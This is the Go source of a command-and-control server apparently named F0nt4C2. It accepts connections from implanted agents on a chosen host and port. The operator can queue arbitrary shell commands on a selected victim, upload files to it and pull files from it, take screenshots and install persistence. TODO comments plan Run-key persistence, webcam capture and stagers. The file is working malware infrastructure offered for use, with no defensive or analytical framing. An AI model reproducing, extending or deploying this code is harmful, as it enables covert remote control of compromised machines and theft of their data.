// Compile with
// => GOOS=windows | $Env:GOOS = 'windows'
// => GOOS=linux | $Env:GOOS = 'linux'
// => go build f0nt4c2.go

// TODO
// - Implement Persistence - https://isc.sans.edu/diary/Adding+Persistence+Via+Scheduled+Tasks/23633
// > Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
// - Implement function to generate beacons
// - Implement new default commands:
//		- screenshot
//		- cam capture
// - Implement stagers do download the agent

package main

import (
	"F0nt4C2/utils/functions"
	utils "F0nt4C2/utils/structures"
	"bufio"
	"encoding/gob"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var version string = "1.0"

// Control agents that are already registered
var activeAgents = []utils.Message{}
var selectedAgentId string = ""
var selectedAgentPWD string = ""

// Flags
var help bool
var LHOST string
var LPORT string

func main() {

	banner()

	handleFlags()

	// Create a fork (go) to execute a loop for ower listener
	if !help {
		go startListener()

		go validateActiveAgents() // function that validates if the agents are active

		cliHandler()
	}

}

func banner() {
	fmt.Println("     ____                                                  ")
	fmt.Println("    /XXXX\\   _       _   __                                ")
	fmt.Println("    |XX|_   / \\  |\\  X|  \\X\\      /\\                       ")
	fmt.Println("    |  __\\ / X \\ |X\\ X| |-X-|    /  \\                      ")
	fmt.Println("    |  |   \\ X / |X \\X|  |X|_   / XX \\                     ")
	fmt.Println("    |_/     \\_/  |X  \\|  \\___\\ /_    _\\                    ")
	fmt.Println("")
	fmt.Println("                    F0nt4C2 Version " + version)
	fmt.Println("")
	fmt.Println("Usage: ./f0nt4c2 -h")
	fmt.Println("")
}

func handleFlags() {

	flag.BoolVar(&help, "h", false, "a bool")
	flag.StringVar(&LHOST, "LHOST", "0.0.0.0", "a string")
	flag.StringVar(&LPORT, "LPORT", "443", "a string")

	flag.Parse()

	if help {
		fmt.Println("[+] Usage:")
		fmt.Println("-h	=> Help command line")
		fmt.Println("-LHOST	=> Define the listener host: -LHOST='127.0.0.1'")
		fmt.Println("-LPORT	=> Define the listener port: -LPORT=443")
	}

}

func cliHandler() {

	time.Sleep(time.Duration(2) * time.Second)

	for {

		if selectedAgentId == "" {

			fmt.Print("\nf0nt4c2> ")

		} else {

			fmt.Print("\n" + selectedAgentId + "@f0nt4c2# ")

		}

		// Read input from the keyboard
		reader := bufio.NewReader(os.Stdin)

		fullCommand, _ := reader.ReadString('\n') // stop the command when the line breaks (space key)

		separatedCommand := functions.SplitCommand(fullCommand) // Make split of space " "

		if len(separatedCommand) > 0 {

			command := strings.TrimSpace(separatedCommand[0])

			switch command {

			case "help":
				showHelp()

			case "show":
				showAgents(separatedCommand)

			case "clear":
				clearInactiveAgents()

			case "select":
				selectAgent(separatedCommand)

			case "upload":
				// Send file from ower machine to the target
				uploadFile(separatedCommand)

			case "download":
				// Download file from target
				downloadFile(separatedCommand)

			case "screenshot":
				// send screenshot command
				takeScreenshot(separatedCommand)

			case "persist":
				// create persistence on the target
				createPersistence(separatedCommand)

			case "exit":
				exitAgent()

			default:

				// If agent is selected, user is trying to insert commands
				if selectedAgentId != "" {

					if command != "" {

						// handle new commands for the agent
						command := &utils.Command{}
						command.Command = fullCommand

						// Find the selected agent
						i := findAgentIndexInActiveAgents(selectedAgentId)

						// Add to the message the command
						activeAgents[i].Commands = append(activeAgents[i].Commands, *command)

					}

				} else {

					fmt.Println("[-] Selected an agent or type 'help' to see the list of commands!")

				}

			}
		}

	}

}

func showHelp() {

	fmt.Println("[+] Options:")
	fmt.Println("- show agents  => Show all available agents")
	fmt.Println("- select <agent_id>  => Enter in selected agent")
	fmt.Println("- clear	=> Clear inactive agents")
	fmt.Println("- upload file.txt  => Upload a file to the target")
	fmt.Println("- download file.txt  => Download a file from the target")
	fmt.Println("- screenshot  => Take screenshot from the targeted desktop")
	fmt.Println("- persist  => Create persistence on the target")
	fmt.Println("- exit  => Exit agent")
	fmt.Println("- help  => Help prompt")

}

func showAgents(separatedCommand []string) {

	fmt.Println("[+] Agents:")

	for _, agents := range activeAgents {
		fmt.Println("=> AgentId: "+agents.AgentId+" | Hostname: "+agents.AgentHostname+" | OS: "+agents.AgentOS+" | Active:", agents.AgentActive)
	}

}

// Clear inactive agents validating their AgentActive flag
func clearInactiveAgents() {

	var activeAgentsNew = []utils.Message{}

	for _, agent := range activeAgents {
		if agent.AgentActive {
			activeAgentsNew = append(activeAgentsNew, agent)
		}
	}

	activeAgents = activeAgentsNew

}

func selectAgent(separatedCommand []string) {

	// Verify if the agent id is informed
	if len(separatedCommand) > 1 {

		agentId := strings.TrimSpace(separatedCommand[1])

		// Verify if the agent id is available
		if verifyAgent(agentId) {

			// Select the agentid
			selectedAgentId = agentId

			// Set the agentPwd
			index := findAgentIndexInActiveAgents(agentId)
			selectedAgentPWD = activeAgents[index].AgentPWD

		} else {
			fmt.Println("[-] The agent id informed is not available, use 'show agents' to show all agents available.")
		}

	} else {

		fmt.Println("[-] Inform the agent id, use 'show agents' to show all agents available.")

	}

}

func exitAgent() {
	selectedAgentId = ""
	selectedAgentPWD = ""
}

// Function that start the listener on the server
func startListener() {

	// Start the listener on the specified port
	listener, err := net.Listen("tcp", LHOST+":"+LPORT)

	fmt.Println("[+] Listener started: " + LHOST + ":" + LPORT)

	// Treat if something goes wrong on starting the port
	if err != nil {
		log.Fatal("[-] Error to start the Listener:", err.Error())
	}

	for {

		// Make ower listener accept connections
		chanel, err := listener.Accept()
		defer chanel.Close() // close the connection after it stops

		if err != nil {
			fmt.Println("[-] Error in a new chanel:", err.Error())
		} else {

			// Receive the information about the connection
			message := &utils.Message{}
			gob.NewDecoder(chanel).Decode(message)

			// Verify if the agent was already registered
			if verifyAgent(message.AgentId) {

				agentIndex := findAgentIndexInActiveAgents(selectedAgentId)

				// Handle any responses from previous commands
				handleResponses(*message)

				// Send message to the agent, sending what is set on the activeAgents global variable, on the position of the agent the we are working with
				gob.NewEncoder(chanel).Encode(activeAgents[agentIndex])

				// Clear the list of commands
				activeAgents[agentIndex].Commands = []utils.Command{}

				// Update last connection time
				activeAgents[agentIndex].LastConnTime = functions.GetCurrentTime()

			} else {

				fmt.Println("[+] New connection: " + message.AgentId)

				if selectedAgentId == "" {

					fmt.Print("\nf0nt4c2> ")

				} else {

					fmt.Print("\n" + selectedAgentId + "@f0nt4c2# ")

				}

				// Set as active and register the first connection time
				message.AgentActive = true
				message.LastConnTime = functions.GetCurrentTime()

				// Add the new agent to the list of active agents
				activeAgents = append(activeAgents, *message)
				gob.NewEncoder(chanel).Encode(message)

			}

		}

	}

}

func verifyAgent(agentId string) bool {

	for _, agent := range activeAgents {

		if agent.AgentId == agentId {
			return true
		}

	}

	return false

}

func handleResponses(message utils.Message) {

	// Update Last Connection Time to manipulate if the agent still active
	index := findAgentIndexInActiveAgents(message.AgentId)
	activeAgents[index].LastConnTime = message.LastConnTime

	i := 0

	for _, command := range message.Commands {

		fmt.Println("\n[+] Command: " + command.Command)
		fmt.Println(command.Response)

		if command.Command == "download" || command.Command == "screenshot" {
			saveFile(command)
		}

		i++

	}

	if i > 0 {
		if selectedAgentId == "" {

			fmt.Print("\nf0nt4c2> ")

		} else {

			fmt.Print("\n" + selectedAgentId + "@f0nt4c2# ")

		}
	}

}

// Function that finds the index of the agent id in the list of active agents
func findAgentIndexInActiveAgents(agentId string) (i int) {
	for i, agent := range activeAgents {
		if agent.AgentId == agentId {
			return i
		}
	}

	return i
}

func uploadFile(separatedCommand []string) {

	if selectedAgentId != "" {

		if len(separatedCommand) > 1 {

			fileToSend := &utils.File{}

			var err error

			fileToSend.Name = separatedCommand[1]
			fileToSend.Content, err = os.ReadFile(fileToSend.Name)

			if err != nil {
				fmt.Println("[-] Error to open the file ", err.Error())
			} else {

				command := &utils.Command{}

				command.Command = separatedCommand[0] // upload
				command.File = *fileToSend

				// Find currently agent
				index := findAgentIndexInActiveAgents(selectedAgentId)

				// Populate the File
				activeAgents[index].Commands = append(activeAgents[index].Commands, *command)

			}

		} else {
			fmt.Println("[-] Specify the file to be uploaded: upload file.txt")
		}

	} else {
		fmt.Println("[-] Select the agent to upload the file: select <agent_id>")
	}
}

func downloadFile(separatedCommand []string) {

	if selectedAgentId != "" {

		if len(separatedCommand) > 1 {

			fileToDownload := &utils.File{}
			fileToDownload.Name = separatedCommand[1]

			command := &utils.Command{}
			command.Command = separatedCommand[0]
			command.File = *fileToDownload

			// Find currently agent
			index := findAgentIndexInActiveAgents(selectedAgentId)

			// Populate the File
			activeAgents[index].Commands = append(activeAgents[index].Commands, *command)

		} else {
			fmt.Println("[-] Specify the file to be downloaded: download file.txt")
		}

	} else {
		fmt.Println("[-] Select the agent to download the file: select <agent_id>")
	}

}

func takeScreenshot(separatedCommand []string) {

	if selectedAgentId != "" {

		command := &utils.Command{}
		command.Command = separatedCommand[0]

		// Find currently agent
		index := findAgentIndexInActiveAgents(selectedAgentId)

		// Populate the File
		activeAgents[index].Commands = append(activeAgents[index].Commands, *command)

	} else {
		fmt.Println("[-] Select the agent to make the screenshot: select <agent_id>")
	}

}

func saveFile(command utils.Command) {

	file := command.File

	err := os.WriteFile(file.Name, file.Content, 0644)

	if err != nil {
		fmt.Println("[-] Error to create the downloaded file: " + err.Error())
	} else {

		currentDir, _ := os.Getwd()

		fullFileDir := filepath.FromSlash(filepath.Join(currentDir, file.Name))

		fmt.Println("[+] File downloaded successfully: " + fullFileDir)

	}

}

func createPersistence(separatedCommand []string) {
	if selectedAgentId != "" {

		command := &utils.Command{}
		command.Command = separatedCommand[0]

		// Find currently agent
		index := findAgentIndexInActiveAgents(selectedAgentId)

		// Populate the File
		activeAgents[index].Commands = append(activeAgents[index].Commands, *command)

	} else {
		fmt.Println("[-] Select the agent to create persistence: select <agent_id>")
	}
}

func validateActiveAgents() {

	for {
		currentTime := functions.GetCurrentTime()

		for i, agent := range activeAgents {

			if agent.AgentActive != false {

				timeCalculation := currentTime - agent.LastConnTime

				if timeCalculation >= 100 {
					activeAgents[i].AgentActive = false
				}

			}
		}

		// Validate every 1 minute
		time.Sleep(time.Duration(60) * time.Second)
	}

}
